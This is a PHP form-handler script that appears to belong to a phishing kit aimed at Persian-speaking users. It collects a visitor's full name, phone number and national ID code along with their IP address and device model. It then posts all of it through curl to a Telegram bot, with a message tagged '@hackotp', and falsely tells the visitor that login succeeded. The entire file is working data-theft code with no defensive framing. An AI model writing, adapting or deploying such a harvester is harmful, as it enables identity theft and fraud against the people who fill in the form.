<?php
$name = $_POST['name'];
$phone = $_POST['phone'];
$meli = $_POST['meli'];
$Domain = $_SERVER["HTTP_HOST"];

if ($meli == null) {
echo json_encode(array('status' => '0', 'message' => 'کد ملی خود را وارد کنید'));
}elseif ($phone == null) {
echo json_encode(array('status' => '0', 'message' => 'شماره همراه خود را وارد کنید'));
} elseif($name == null) {
echo json_encode(array('status' => '0', 'message' => ' نام و نام خانوادگی خود را وارد کنید'));
} else {
$browser = $_SERVER['HTTP_USER_AGENT'];
if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
$ip = $_SERVER["HTTP_CLIENT_IP"];
} else {
if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
} else {
$ip = $_SERVER["REMOTE_ADDR"];
}
}
    $devices = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT']) [4], ')');
    $devices2 = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT']) [3], ')');

$token = "6DQ";
$id ="";

$des = "  
NeW TaR 💸 

╠Nᴀᴍᴇ  ➣ <code>$name</code>
╠Pʜᴏɴ  ➣ <code>$phone</code> 
╠Cᴍᴇʟɪ ➣ <code>$meli</code>
@hackotp
ɪᴘ : <code>$ip</code>
ᴍᴏᴅᴇʟ : <code>$devices $devices2</code>
ᴅᴏᴍᴀɪɴ : <code>$Domain</code>
";
  $send = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($des) . '&parse_mode=HTML';
    $params = [
'chat_id' => $id,
'text' => $des,
'parse_mode' => 'HTML'
];
    $website = "https://api.telegram.org/bot" . $token;
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
      echo json_encode(array('status' => '1', 'message' => 'ورود موفقیت آمیز بود'));
}
?>
